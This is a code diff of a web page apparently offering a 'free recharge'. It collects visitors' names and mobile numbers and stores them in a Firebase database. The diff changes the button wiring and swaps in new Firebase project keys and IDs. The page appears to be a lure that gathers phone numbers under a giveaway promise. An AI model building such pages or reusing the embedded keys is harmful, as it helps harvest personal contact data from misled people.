@@ -213,7 +213,7 @@ placeholder="Enter 10 Digit Number"
 oninput="this.value=this.value.replace(/[^0-9]/g,'')"
 >
 
-<button class="submit" onclick="submitData()">
+<button class="submit" id="submitBtn">
 SUBMIT
 </button>
 
@@ -248,20 +248,20 @@ from "https://www.gstatic.com/firebasejs/12.13.0/firebase-database.js";
 
 const firebaseConfig = {
 
-apiKey: "AIzaSyBbjsPPU8cvbGhs8cWoXU-YwLdmeNW_aqw",
+apiKey: "AIzaSyBxmlDUkCLOMdYQg7m6fdNj2Rk6F-vA1Jk",
 
-authDomain: "tvk-win-free-recharge.firebaseapp.com",
+authDomain: "tvk-free-recharge-3d61c.firebaseapp.com",
 
 databaseURL:
-"https://tvk-win-free-recharge-default-rtdb.firebaseio.com",
+"https://tvk-free-recharge-3d61c-default-rtdb.firebaseio.com",
 
-projectId: "tvk-win-free-recharge",
+projectId: "tvk-free-recharge-3d61c",
 
-storageBucket: "tvk-win-free-recharge.firebasestorage.app",
+storageBucket: "tvk-free-recharge-3d61c.firebasestorage.app",
 
-messagingSenderId: "316574280691",
+messagingSenderId: "553633392326",
 
-appId: "1:316574280691:web:bc3b2bdcabecb879ab8086"
+appId: "1:553633392326:web:1110a66515a034375f99c7"
 
 };
 
@@ -282,9 +282,10 @@ document.getElementById("popup").style.display = "flex";
 }
 
 
-// SUBMIT DATA
+// SUBMIT BUTTON
 
-window.submitData = async function(){
+document.getElementById("submitBtn").addEventListener("click", async function(){
+
 
 let name =
 document.getElementById("name").value.trim();
@@ -293,7 +294,7 @@ let number =
 document.getElementById("mobile").value.trim();
 
 
-// CHECK NAME
+// VALIDATION
 
 if(name === ""){
 
@@ -301,9 +302,6 @@ alert("Please Enter Your Name");
 return;
 
 }
-
-
-// CHECK MOBILE
 
 if(number.length !== 10){
 
@@ -313,9 +311,9 @@ return;
 }
 
 
-// STORE DATA IN FIREBASE
-
 try{
+
+// SAVE TO FIREBASE
 
 await push(ref(database,"TVK_Recharge_Users"),{
 
@@ -325,19 +323,22 @@ time:new Date().toLocaleString()
 
 });
 
+
+// SUCCESS
+
 alert("Data Stored Successfully 🔥");
 
 
 // CLEAR INPUTS
 
 document.getElementById("name").value = "";
-
 document.getElementById("mobile").value = "";
 
 
 // CLOSE POPUP
 
 document.getElementById("popup").style.display = "none";
+
 
 }catch(error){
 
@@ -347,7 +348,7 @@ alert("Firebase Error: " + error.message);
 
 }
 
-}
+});
 
 </script>
 
